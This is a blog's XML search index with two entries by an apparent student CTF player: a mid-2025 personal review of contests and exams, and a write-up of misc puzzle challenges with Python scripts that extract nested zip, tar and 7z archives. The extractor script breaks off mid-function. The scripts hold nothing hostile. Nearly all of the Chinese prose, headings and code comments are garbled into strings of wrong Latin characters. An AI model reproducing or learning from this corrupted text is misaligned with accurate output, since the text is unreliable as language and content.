<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2025å¹´ä¸­æ€»ç»“</title>
    <url>/2025/06/22/2025%E5%B9%B4%E4%B8%AD%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="å‡‘æ–°æ‰‹-æè´­-çš„å¹´ä¸­æ€»ç»“"><a href="#å‡‘æ–°æ‰‹-æè´­-çš„å¹´ä¸­æ€»ç»“" class="headerlink" title="å‡‘æ–°æ‰‹(æè´­)çš„å¹´ä¸­æ€»ç»“"></a>å‡‘æ–°æ‰‹(æè´­)çš„å¹´ä¸­æ€»ç»“</h1><p>åˆšè€ƒå®Œç‹—å²æœŸæœ«è€ƒè¯•çš„ä¸‹åˆï¼Œæƒ³ç€è¿™ä¸ªå­¦æœŸä¹Ÿç»“æŸäº†<br>æ„Ÿè§‰æœŸæœ«å‘¨å¿™äº†å’Œæ²¡å¿™ä¸€æ ·å•Šï¼Œä¹Ÿå­¦ä¸åˆ°ä¸œè¥¿ã€‚ã€‚ã€‚åªæ˜¯ä¸ºäº†åº”ä»˜è€ƒè¯•å’Œé‚£è¯¥æ­»çš„ä¿ç ”åé¢(ä¸ºäº†äº‰è¿™ä¸ªä¹Ÿæ˜¯è¢«å·çš„ä¸è¡Œå“ˆå“ˆâ€¦ç„¶åä¹Ÿå‘ç°å’Œåˆ«äººæ— æ„ä¹‰çš„äº’æ€¼å†…å·è²Œä¼¼ä¹Ÿæ²¡å•¥æ„ä¹‰ï¼Œå¤ªç´¯äº†)<br>å½“ç„¶è€ƒè¯•å‘¨ä¸èƒ½è¯´æ˜¯æ²¡æœ‰æ”¶è·ï¼Œæ¯•ç«Ÿè¿™ä¸¤å‘¨è¿˜æ˜¯æœ‰ç‚¹æ›²æŠ˜å“ˆå“ˆã€‚<br>å…ˆç®€å•çš„å›é¡¾ä¸‹ä¸ŠåŠå¹´åšäº†ä»€ä¹ˆå§</p>
<h2 id="ä¸€æœˆ"><a href="#ä¸€æœˆ" class="headerlink" title="ä¸€æœˆ"></a>ä¸€æœˆ</h2><p>æ²¡è®°é”™çš„è¯é‚£ä¸ªæ—¶å€™ä¹Ÿæ˜¯æœŸæœ«å‘¨æ¥ç€ï¼Œé‚£ä¸ªæ—¶å€™è¿˜æ˜¯å¾ˆæœ‰åŠ¨åŠ›å»å‡†å¤‡æœŸæœ«è€ƒçš„ï¼Œç°åœ¨çœ‹æ¥å‘ç°ä¸çŸ¥é“åœ¨ç‡ƒä»€ä¹ˆã€‚ã€‚<br>ä¹‹åæ˜¯è½¯ä»¶èµ›çš„åˆèµ›ã€‚<br><strong>çˆ†é›¶äº†</strong><br>å½“äº†ä¸€æŠŠ<code>town in go</code>ï¼Œå½“æ—¶å°±åœ¨æƒ³è‡ªå·±æ€ä¹ˆè¿™ä¹ˆèœï¼Œè™½ç„¶ç°åœ¨ä¹Ÿæ˜¯è¿™ä¹ˆæƒ³çš„ã€‚é‚£ä¸ªæ—¶å€™è²Œä¼¼æ˜¯åˆšå¼€å§‹ä»<code>misc</code>è½¬å‹<code>web</code>æ¥ç€ï¼Œä¹Ÿæƒ³è¿‡è‡ªå·±ä¼šä¸ä¼šè½¬å‹å¤±è´¥ç›´æ¥å’Œctfæ‹œæ‹œï¼Œä½†æ˜¯å¤ªå¥½äº†ï¼Œè½¬å‹è¿˜ç®—æˆåŠŸï¼Œå’Œè€ƒè¯•ç›¸æ¯”ï¼Œè¿˜æ˜¯<code>ctf</code>æ›´å¥½ç©<del>ç­‰åˆçˆ†é›¶äº†ä½ å°±ä¸è¯´è¯äº†</del><br>é‚£ä¸ªæ—¶å€™å†™äº†ä¸ªè®¡åˆ’ï¼Œå¯æƒœåˆ°å¯’å‡ç»“æŸæˆ‘éƒ½æ²¡æœ‰å®Œæˆå®ƒ(<br>è¿˜é¡ºå¸¦æ‰“äº†ä¸ªæ˜¥ç§‹æ¯å†¬å­£èµ›ï¼Œç‹ ç‹ åƒ<code>misc</code>è€åº•</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250622155910679.png" alt="image-20250622155910679"></p>
<h2 id="äºŒæœˆ"><a href="#äºŒæœˆ" class="headerlink" title="äºŒæœˆ"></a>äºŒæœˆ</h2><p>äºŒæœˆå°è±¡æœ€æ·±çš„å¤§æ¦‚æ˜¯ï¼Œç¬¬ä¸€æ¬¡å‚åŠ éæ–°ç”Ÿèµ›ï¼Œ<strong>VNCTF</strong><br>ä¹Ÿæ˜¯åƒ<code>misc</code>è€åº•ã€‚<del>æˆ‘å—?å…¬å¼€èµ›æ‰“è¿˜æ²¡å…¥é—¨çš„æ–¹å‘?çœŸçš„å‡çš„?</del><br>åé¢å°±å›å»å¼€å­¦äº†ï¼Œåé¢å¿˜äº†ã€‚ã€‚</p>
<p>o ,è¿˜æœ‰HGAME,åªåšäº†w1å¥½åƒï¼Œè°œè¯­äººé¢˜ç›®w2å°±æ²¡å»åšäº†è¯´æ˜¯</p>
<h2 id="ä¸‰æœˆ"><a href="#ä¸‰æœˆ" class="headerlink" title="ä¸‰æœˆ"></a>ä¸‰æœˆ</h2><p>è¿™ä¸ªæ—¶å€™å¤§æ¦‚æ˜¯åœ¨è¾¹ç„¦è™‘è¾¹å‡†å¤‡æ ¡èµ›å§ã€‚å¥½å®³æ€•è‡ªå·±è¢«å¤©èµ‹å“¥å¹²çˆ†äº†ã€‚å»å‚åŠ è€ç™»ç»„ç»‡çš„åŸ¹è®­ä¸ƒä¸ƒå…«å…«(å‰é¢å¿˜äº†ï¼Œåé¢å¿˜äº†ï¼Œåªè®°å¾—è¢«c3ç›’äº†)<br>æœ€å€’éœ‰çš„æ˜¯æœˆæœ«ï¼Œæ‰‹æœºè¢«ä¸‹æ°´é“ä¿˜è·äº†ï¼Œå¿ç—›æ¢ä¸€ä¸ªæ–°çš„ï¼Œä»æ­¤å¯å®¤å•æ‰€é‡Œå¤šäº†ä¸€æ¡å‡³å­ã€‚(<code>rz</code>å­¦æ ¡å•æ‰€é…ç½®ä¸ç»Ÿä¸€)</p>
<p>(çºªå¿µä¸€ä¸‹æˆ‘æ­»å»çš„æ‰‹æœºï¼Œé™ªäº†ä¸»åŒ…ä¸‰å¹´æ²¡æƒ³åˆ°æŠ˜åœ¨è¿™ç§åœ°æ–¹äº†å”‰å”‰)</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/a8ce2a9b3ae7cd283f921e82f02ac146_720.jpg" alt="a8ce2a9b3ae7cd283f921e82f02ac146_720"></p>
<h2 id="å››æœˆ"><a href="#å››æœˆ" class="headerlink" title="å››æœˆ"></a>å››æœˆ</h2><p>æœˆåˆæ˜¯æ ¡èµ›æ¥ç€ï¼Œè™½ç„¶å‹åŠ›å¾ˆå¤§ï¼Œä½†æ˜¯æœ€åé¡¶ä½å‹åŠ›é è¿æ°”å¥½æ‹¿äº†ç¬¬</p>
<p>äºŒï¼Œä½†æ˜¯å…¶å®å¼€èµ›30åˆ†é’Ÿå†…æˆ‘éƒ½æ˜¯ç´§å¼ å¾—æ— æ³•è§£é¢˜ã€‚è¿˜æ˜¯å¤ªå«©äº†å“ˆå“ˆã€‚ã€‚æ„Ÿè§‰ä»¥åå½“è€èµ›æ£äº†ä¼šå¥½ç‚¹ï¼Œè¿˜æ˜¯æˆåŠŸè¿›é˜Ÿäº†</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/2f37f17af40646f54c57f09d6628bfe3.jpg" alt="2f37f17af40646f54c57f09d6628bfe3">åæ¥æ‰“äº†æ­å¸ˆçš„<code>GHCTF</code>ï¼Œæˆ‘è‰æ€ä¹ˆè¢«è¿˜æ²¡è¿›é˜Ÿçš„å•æ€äº†ã€‚?<br>æ•…å¿æ‚”ã€‚</p>
<h2 id="äº”æœˆ"><a href="#äº”æœˆ" class="headerlink" title="äº”æœˆ"></a>äº”æœˆ</h2><p>äº”ä¸€?æ‹¿æ¥å§ä½ ï¼Œ<code>miniCTF</code>æ¥å’¯ï¼(ä¹</p>
<p>ç¬¬äºŒæ¬¡æ‰“å…¬å¼€èµ›(åº”è¯¥ç®—å…¬å¼€èµ›å§)</p>
<p>ååº”belike:<code>misc</code>æ€ä¹ˆé‚£ä¹ˆå¤šé•¿çš„åƒwebçš„ï¼Œ<code>web</code>è¿™æ€ä¹ˆéƒ½æ˜¯å‰ç«¯ï¼Œwcæ€ä¹ˆä»–ä»¬éƒ½ä¼šï¼Œåˆè¢«å¦ä¸€ä¸ªåŒå¹´çº§çš„<code>web</code>æ‰‹æ‹·æ‰“äº†ã€‚</p>
<p>æœ€åè¿˜æ˜¯é ç€è€ç™»ä¸Šå·å‘åŠ›äº†æ‰“ä¸Šå»ã€‚</p>
<p>æˆ‘,å†å¿æ‚”ã€‚</p>
<h2 id="å…­æœˆ"><a href="#å…­æœˆ" class="headerlink" title="å…­æœˆ"></a>å…­æœˆ</h2><p>çº±å¸ƒæœŸæœ«å‘¨ï¼ŒæœŸæœ«å‘¨å‰è¿˜æœ‰ä¸€ä¸ª<code>LitCTF</code>ï¼Œå­¦é•¿è¯´è®©æˆ‘<code>ak</code>ï¼Œæˆ‘å…­ç¼º2ï¼Œå‰©ä¸‹çš„ä¸€ä¸ªæ˜¯å¼±å¯†ç ï¼Œä¸€ä¸ªæ˜¯ååºåˆ—åŒ–ï¼Œèœèœèœèœèœèœ<br>æŠ±æ†¾å»å‚åŠ æœŸæœ«è€ƒï¼Œæ›´æŠ±æ†¾äº†<del>åŠå­¦æ ¡è€ƒè¯•æ’çš„ä»€ä¹ˆæ—¥ç¨‹åƒæŸ æª¬</del></p>
<p>è€ƒäº†ä¸€åŠæ•°æ®ç»“æ„æˆç»©å‡ºæ¥å‘ç°8å¼€å¤´å¤©éƒ½å¡Œäº†ï¼Œä¿ä½ ç ç ”ä¿ï¼Œä¸ä¿äº†(</p>
<p>å†å†å¿æ‚”ã€‚ï¼Ÿå¿ä½ å—æ‚”ï¼Œæ²¡å•¥è½¯ç”¨å•Šæˆ‘çœ‹ã€‚</p>
<p>æ„Ÿè§‰è¦é‡æ–°ç£¨ç ºä¸€ä¸‹è‡ªå·±çš„é›†ä¸­åŠ›å’Œæ„å¿—åŠ›äº†ã€‚ä¸ç„¶æ„Ÿè§‰ä¼šåœ¨æ°´ç¾¤ä¸­è¿·å¤±äº†æ–¹å‘å•Šã€‚ã€‚</p>
<p>æƒ³åšæŠ€æœ¯å‹ä¸»åŒ…æ¥ç€()</p>
<p>å½“ç„¶åœ¨è€ƒè¯•çš„è¿‡ç¨‹ä¸­ä¹Ÿè€ƒè™‘è¿‡å·è¿™ä¸ªé—®é¢˜ï¼Œå¥½æƒ³å·è¿‡ï¼Œä½†æ˜¯æ—¥é˜²å¤œæ”¾æ”¾åˆ°ç°åœ¨ï¼Œå‘ç°è¿˜æ˜¯å·ä¸è¿‡ã€‚ä¹Ÿè¿‡éƒéƒä¸å¾—å¿—çš„æ—¶å€™ï¼Œæ„Ÿè§‰å¥½åƒå¸¦å­¦å’Œè‡ªå·±æƒ³è±¡çš„ä¸ä¸€æ ·ï¼Œæ„Ÿè§‰å¤±å»ä¹è¶£äº†ã€‚ä½†æ˜¯æœ€ååœ¨æœ‹å‹çš„å¸®åŠ©ä¸‹è¿˜æ˜¯é‡æ‹¾äº†ä¿¡å¿ƒï¼Œå¤§äºŒç»™ä»–ä»¬æ¥ä¸ªå¤§çš„(å¸Œæœ›å¦‚æ­¤ï¼Œå¹¶éå¼€ç©ç¬‘ã€‚)</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/2fedb402d4e9ac66330c6287e44b72c6_720.jpg" alt="2fedb402d4e9ac66330c6287e44b72c6_720"></p>
<p>å°±å¤ç›˜åˆ°è¿™é‡Œå§ï¼Œæ˜å¤©è¿˜æœ‰è¯¾ç¨‹è®¾è®¡æ¥ç€ï¼Œå•¥æ¯”å­¦æ ¡èŠ±æ´»è¿˜çœŸæ˜¯æœ‰ç‚¹å¤šå•Šæˆ‘çœ‹ã€‚æ˜æ˜æœŸæœ«è€ƒè€ƒå®Œäº†è¿˜è¿Ÿè¿Ÿä¸è‚¯æ”¾å­¦ç”Ÿèµ°å—(è™½ç„¶è¦é›†è®­æˆ‘æœ¬èº«å°±èµ°ä¸äº†å“ˆå“ˆã€‚</p>
]]></content>
      <tags>
        <tag>-æ€»ç»“</tag>
      </tags>
  </entry>
  <entry>
    <title>2025æ˜¥ç§‹æ¯å†¬å­£èµ›</title>
    <url>/2025/01/21/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/</url>
    <content><![CDATA[<p>èœé¸Ÿç¬¬ä¸€æ¬¡æ‰“è¿™ç§å…¬å¼€èµ›ï¼Œæ„Ÿè§‰è¢«æ©„æ¦„äº†ï¼Œç¬¬äºŒå¤©ä¸¤ä¸ªpyjailæ˜¯ä¸€ç‚¹åŠæ³•éƒ½æ²¡æœ‰å•Šã€‚ã€‚ã€‚</p>
<p>å¬C3å¸ˆå‚…è¯´è¿™è¿˜ä¸ç®—æ˜¯ä¸Šå¼ºåº¦çš„</p>
<p>è€Œä¸”å‡†å¤‡è½¬å‹Webå´åªåšå‡ºæ¥ä¸€ä¸ªç­¾åˆ°å±äºæ˜¯ã€‚ã€‚æœ‰ç‚¹ä¸¢äººäº†</p>
<p>è¿˜æ˜¯è¦å¤šç»ƒï¼Œä¸‹æ¬¡åŠªåŠ›ä¸å•ƒMiscè€åº•</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="ç®€å•ç®—æœ¯ï¼š"><a href="#ç®€å•ç®—æœ¯ï¼š" class="headerlink" title="ç®€å•ç®—æœ¯ï¼š"></a>ç®€å•ç®—æœ¯ï¼š</h2><p>æ ¹æ®æç¤ºï¼Œæƒ³æƒ³å¼‚æˆ–ï¼Œç›´æ¥å°è¯•Cyberchefä¸€æŠŠæ¢­</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117150938338.png" alt="image-20250117150938338"></p>
<h2 id="See-anything-in-these-pics"><a href="#See-anything-in-these-pics" class="headerlink" title="See anything in these pics?"></a>See anything in these pics?</h2><p>é™„ä»¶ç»™äº†ä¸€ä¸ªå‹ç¼©åŒ…å’Œä¸€å¼ é˜¿å…¹ç‰¹å…‹ç </p>
<p>è§£æå¾—åˆ°</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117152921150.png" alt="image-20250117152921150"></p>
<p>æ€€ç–‘æ˜¯å‹ç¼©åŒ…çš„å¯†ç ï¼Œå¸¦å…¥è§£å‹å‹ç¼©åŒ…ï¼Œè§£å‹æˆåŠŸï¼Œå¾—åˆ°ä¸€å¼ jpg</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/YVL.jpg" alt="YVL"></p>
<p>çœ‹å›¾ç‰‡ç»“åˆæç¤º(å›¾ç‰‡ä¸æ­¢ä¸¤å¼ )çŒœæµ‹ä¸€å…±æœ‰ä¸‰å¼ å›¾ï¼Œæ‰“å¼€010æŸ¥ä¸€ä¸‹ï¼Œå‘ç°PNGå¤´<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117153320612.png" alt="image-20250117153320612"></p>
<p>foremostæå–ä¸€ä¸‹å‘ç°æ˜¯å…¨é»‘çš„ï¼ŒçŒœæµ‹æ˜¯crcæ ¡éªŒé”™è¯¯ï¼Œæ‰“å¼€010å‘ç°æŠ¥é”™æ£€éªŒçŒœæƒ³ï¼Œæœ€åéšæ³¢é€æµç›´æ¥å‡º(ä¹Ÿå¯ä»¥ç›´æ¥éšæ³¢é€æµä¸€æŠŠæ¢­)</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117184730714.png" alt="image-20250117184730714"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/00000149-%E4%BF%AE%E5%A4%8D%E9%AB%98%E5%AE%BD.png" alt="00000149-ä¿®å¤é«˜å®½"></p>
<h2 id="å‹åŠ›å¤§ï¼Œå†™ä¸ªè„šæœ¬å§"><a href="#å‹åŠ›å¤§ï¼Œå†™ä¸ªè„šæœ¬å§" class="headerlink" title="å‹åŠ›å¤§ï¼Œå†™ä¸ªè„šæœ¬å§"></a>å‹åŠ›å¤§ï¼Œå†™ä¸ªè„šæœ¬å§</h2><p>å…ˆè¯•ç€è§£å‹å‡ ä¸ªåŒ…ï¼ŒæŠŠç»™çš„å¯†æ–‡base64è§£ç åæ˜¯FGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFG</p>
<p>ç„¶åå‘ç°åé¢å‡ ä¸ªåŒ…çš„å¯†æ–‡éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå†™ä¸ªè„šæœ¬ç›´æ¥çˆ†</p>
<pre><code class="highlight python"><span class="keyword">import</span> zipfile
<span class="keyword">import</span> re
zipname = <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_99.zip&quot;</span>
<span class="keyword">while</span> <span class="literal">True</span>:
    <span class="keyword">if</span> zipname != <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_1.zip&quot;</span>:
        ts1 = zipfile.ZipFile(zipname)
        passwd =<span class="string">b&#x27;FGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFG&#x27;</span>
        ts1.extractall(<span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&quot;</span>,pwd=passwd)
        zipname = <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&quot;</span>+ts1.namelist()[<span class="number">0</span>]
    <span class="keyword">else</span>:
        <span class="built_in">print</span>(<span class="string">&quot;find&quot;</span>)</code></pre>

<p>ç»“æœå‘ç°ç¬¬95åŒ…å¯†ç æ¢äº†ã€‚è§£å‹æ˜¾ç¤ºå¤±è´¥ï¼Œé‚£ä¹ˆç›´æ¥è·å–txtçš„å†…å®¹è§£ç åè§£å‹å‹ç¼©åŒ…ã€‚</p>
<pre><code class="highlight python"><span class="keyword">import</span> zipfile
<span class="keyword">import</span> os
<span class="keyword">import</span> base64

<span class="keyword">def</span> <span class="title function_">decode_password</span>(<span class="params">file_path</span>):
    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
        encoded_password = f.read().strip()
    decoded_password = base64.b64decode(encoded_password).decode(<span class="string">&#x27;utf-8&#x27;</span>)
    <span class="keyword">return</span> decoded_password
<span class="keyword">def</span> <span class="title function_">extract_zip</span>(<span class="params">zip_file, password, extract_to</span>):
    <span class="keyword">try</span>:
        <span class="keyword">with</span> zipfile.ZipFile(zip_file) <span class="keyword">as</span> zf:
            zf.extractall(path=extract_to, pwd=password.encode())
            <span class="built_in">print</span>(<span class="string">f&quot;è§£å‹æˆåŠŸ: <span class="subst">&#123;zip_file&#125;</span> åˆ° <span class="subst">&#123;extract_to&#125;</span>&quot;</span>)
            <span class="keyword">return</span> zf.namelist()  
    <span class="keyword">except</span> (zipfile.BadZipFile, RuntimeError) <span class="keyword">as</span> e:
        <span class="built_in">print</span>(<span class="string">f&quot;è§£å‹å¤±è´¥: <span class="subst">&#123;zip_file&#125;</span>, é”™è¯¯: <span class="subst">&#123;e&#125;</span>&quot;</span>)
        <span class="keyword">return</span> []
<span class="keyword">def</span> <span class="title function_">recursive_extract</span>(<span class="params">start_number=<span class="number">99</span>,parent_dir=<span class="string">&#x27;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&#x27;</span></span>):
    current_number = start_number
    <span class="keyword">while</span> <span class="literal">True</span>:
        zip_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_<span class="subst">&#123;current_number&#125;</span>.zip&quot;</span>
        password_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\password_<span class="subst">&#123;current_number&#125;</span>.txt&quot;</span>
        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(zip_filename):
            <span class="built_in">print</span>(<span class="string">f&quot;æ–‡ä»¶ä¸å­˜åœ¨: <span class="subst">&#123;zip_filename&#125;</span>&quot;</span>)
            <span class="keyword">break</span>
        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(password_filename):
            <span class="built_in">print</span>(<span class="string">f&quot;å¯†ç æ–‡ä»¶ä¸å­˜åœ¨: <span class="subst">&#123;password_filename&#125;</span>&quot;</span>)
            <span class="keyword">break</span>
        password = decode_password(password_filename)
        extracted_files = extract_zip(zip_filename, password,parent_dir)
        <span class="keyword">if</span> <span class="keyword">not</span> extracted_files:
            <span class="keyword">break</span>
        next_zip_file = <span class="literal">None</span>
        <span class="keyword">for</span> extracted_file <span class="keyword">in</span> extracted_files:
            <span class="keyword">if</span> extracted_file.endswith(<span class="string">&#x27;.zip&#x27;</span>):
                next_zip_file = extracted_file
                <span class="keyword">break</span>
        <span class="keyword">if</span> next_zip_file <span class="keyword">is</span> <span class="literal">None</span>:
            <span class="keyword">break</span>
        current_number -= <span class="number">1</span>
<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
    recursive_extract()</code></pre>

<p>è§£ç åå¾—åˆ°hint<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117181031624.png" alt="image-20250117181031624"></p>
<p>åº”è¯¥æ˜¯è®©æˆ‘ä»¬æŠŠæ¯ä¸ªå‹ç¼©åŒ…çš„å¯†ç è§£ç åç»„æˆhexç äº§ç”Ÿä¸€ä¸ªpngå›¾ç‰‡</p>
<p>æ ¹æ®æˆ‘ä»¬ç¬¬ä¸€ä¸ªå¯†ç FGâ€¦..ï¼Œæ˜¾ç„¶ä¸æ˜¯æ–‡ä»¶å¤´çš„æ ¼å¼ï¼Œé‚£ä¹ˆä»0å¼€å§‹åˆ°99æå–æ–‡ä»¶å†…å®¹</p>
<pre><code class="highlight python"><span class="keyword">import</span> os
<span class="keyword">import</span> base64


<span class="keyword">def</span> <span class="title function_">decode_password</span>(<span class="params">file_path</span>):
    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
        encoded_password = f.read().strip()
    decoded_password = base64.b64decode(encoded_password).decode(<span class="string">&#x27;utf-8&#x27;</span>)
    <span class="keyword">return</span> decoded_password

<span class="keyword">def</span> <span class="title function_">extract_decoded_passwords</span>(<span class="params">start_number=<span class="number">0</span>, output_file=<span class="string">&#x27;decoded_passwords.txt&#x27;</span></span>):
    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output_f:
        current_number = start_number
        <span class="keyword">while</span> <span class="literal">True</span>:
            password_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\password_<span class="subst">&#123;current_number&#125;</span>.txt&quot;</span>
            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(password_filename):
                <span class="built_in">print</span>(<span class="string">f&quot;å¯†ç æ–‡ä»¶ä¸å­˜åœ¨: <span class="subst">&#123;password_filename&#125;</span>&quot;</span>)
                <span class="keyword">break</span>
            decoded_password = decode_password(password_filename)
            output_f.write(<span class="string">f&quot;<span class="subst">&#123;decoded_password&#125;</span>&quot;</span>)
            <span class="built_in">print</span>(<span class="string">f&quot;å¯†ç _<span class="subst">&#123;current_number&#125;</span> è§£ç å¹¶ä¿å­˜ã€‚&quot;</span>)
            current_number += <span class="number">1</span>


<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
    extract_decoded_passwords(start_number=<span class="number">0</span>, output_file=<span class="string">&#x27;C:\\Users\\ayano\\Desktop\\1.txt&#x27;</span>)</code></pre>

<p>æœ€ç»ˆå¾—åˆ°çš„åœ¨010ä¸­ç²˜è´´ä¸ºhexç ï¼Œå¾—åˆ°ä¸€ä¸ªäºŒç»´ç ï¼Œæ‰«ä¸€ä¸‹</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117181408150.png"></p>
<h2 id="Infinity"><a href="#Infinity" class="headerlink" title="Infinity"></a>Infinity</h2><p>é¦–å…ˆçœ‹æç¤ºæ˜¯ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨çš„</p>
<p>æ‹¿åˆ°ä¸€å¼ pngï¼Œç”¨010æŸ¥ä¸€ä¸‹çœ‹åˆ°zipå¤´</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119164920069.png" alt="image-20250119164920069"></p>
<p>foremostæå–ä¸€ä¸‹</p>
<p>å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œåœ¨è§£å‹å‡ æ¬¡åå‘ç°æ˜¯ä¸ªåµŒå¥—çš„å‹ç¼©åŒ…</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119165111733.png" alt="image-20250119165111733">ä¸€å…±æœ‰7z,tar,zipä¸‰ç§ç±»å‹çš„å‹ç¼©åŒ…</p>
<p>åŒæ—¶æ³¨æ„åˆ°æ–‡ä»¶åæœ‰ç‚¹å¯ç–‘ï¼Œç•™æ„ä¸€ä¸‹ï¼Œå¯èƒ½åç»­è¦ç”¨</p>
<p>è„šæœ¬ï¼š</p>
<pre><code class="highlight plaintext">import os
import zipfile
import tarfile
import py7zr
import shutil


def extract_zip(zip_path, extract_dir):
    &quot;&quot;&quot;è§£å‹zipæ–‡ä»¶&quot;&quot;&quot;
    with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as zip_ref:
        zip_ref.extractall(extract_dir)
        return zip_ref.namelist()  # è¿”å›è§£å‹å‡ºæ¥çš„æ–‡ä»¶åˆ—è¡¨


def extract_tar(tar_path, extract_dir):
    &quot;&quot;&quot;è§£å‹taræ–‡ä»¶&quot;&quot;&quot;
    with tarfile.open(tar_path, &#x27;r&#x27;) as tar_ref:
        tar_ref.extractall(extract_dir)
        return tar_ref.getnames()  # è¿”å›è§£å‹å‡ºæ¥çš„æ–‡ä»¶åˆ—è¡¨


def extract_7z(archive_path, extract_dir):
    &quot;&quot;&quot;è§£å‹7zæ–‡ä»¶&quot;&quot;&quot;
    with py7zr.SevenZipFile(archive_path, mode=&#x27;r&#x27;) as archive_ref:
        archive_ref.extractall(extract_dir)
        return archive_ref.getnames()  # è¿”å›è§£å‹å‡ºæ¥çš„æ–‡ä»¶åˆ—è¡¨


def handle_compressed_file(file_path, extract_dir, output_txt):
    &quot;&quot;&quot;å¤„ç†å‹ç¼©åŒ…æ–‡ä»¶ï¼šè§£å‹å¹¶è®°å½•æ–‡ä»¶åï¼ˆå»æ‰åç¼€å¹¶è¿æ¥ï¼‰&quot;&quot;&quot;
    if file_path.endswith(&#x27;.zip&#x27;):
        extracted_files = extract_zip(file_path, extract_dir)
    elif file_path.endswith(&#x27;.tar&#x27;):
        extracted_files = extract_tar(file_path, extract_dir)
    elif file_path.endswith(&#x27;.7z&#x27;):
        extracted_files = extract_7z(file_path, extract_dir)
    else:
        print(f&quot;ä¸æ”¯æŒçš„å‹ç¼©æ ¼å¼ï¼š&#123;file_path&#125;&quot;)
        return []

    # è®°å½•å»æ‰åç¼€å¹¶è¿æ¥çš„æ–‡ä»¶å
    with open(output_txt, &#x27;a&#x27;) as output_file:
        for file_name in extracted_files:
            name_without_extension = os.path.splitext(file_name)[0]  # å»æ‰åç¼€
            output_file.write(f&quot;&#123;name_without_extension&#125;\n&quot;)

    return extracted_files


def process_zip(zip_path, extract_dir, output_txt):
    &quot;&quot;&quot;å¤„ç†zipæ–‡ä»¶å¹¶é€’å½’è§£å‹å…¶ä¸­çš„å‹ç¼©åŒ…&quot;&quot;&quot;
    # è§£å‹å½“å‰zipæ–‡ä»¶å¹¶è¿”å›è§£å‹åçš„æ–‡ä»¶åˆ—è¡¨
    extracted_files = extract_zip(zip_path, extract_dir)

    for extracted_file in extracted_files:
        extracted_file_path = os.path.join(extract_dir, extracted_file)

        if os.path.isdir(extracted_file_path):
            continue  # è·³è¿‡ç›®å½•

        # å¦‚æœè§£å‹å‡ºæ¥çš„æ˜¯å‹ç¼©åŒ…ï¼Œå†è¿›è¡Œé€’å½’å¤„ç†
        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
            # è§£å‹åµŒå¥—å‹ç¼©åŒ…å¹¶å¤„ç†
            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
            # å¦‚æœæ˜¯åµŒå¥—çš„å‹ç¼©åŒ…ï¼Œå†é€’å½’è°ƒç”¨
            if extracted_file.endswith(&#x27;.zip&#x27;):
                process_zip(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.tar&#x27;):
                process_tar(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.7z&#x27;):
                process_7z(extracted_file_path, extract_dir, output_txt)

        else:
            handle_compressed_file(extracted_file_path, extract_dir, output_txt)

    # åˆ é™¤å½“å‰å¤„ç†çš„å‹ç¼©åŒ…
    if zip_path.endswith(&#x27;.zip&#x27;):
        os.remove(zip_path)


def process_tar(tar_path, extract_dir, output_txt):
    &quot;&quot;&quot;å¤„ç†taræ–‡ä»¶å¹¶é€’å½’è§£å‹å…¶ä¸­çš„å‹ç¼©åŒ…&quot;&quot;&quot;
    extracted_files = extract_tar(tar_path, extract_dir)
    for extracted_file in extracted_files:
        extracted_file_path = os.path.join(extract_dir, extracted_file)

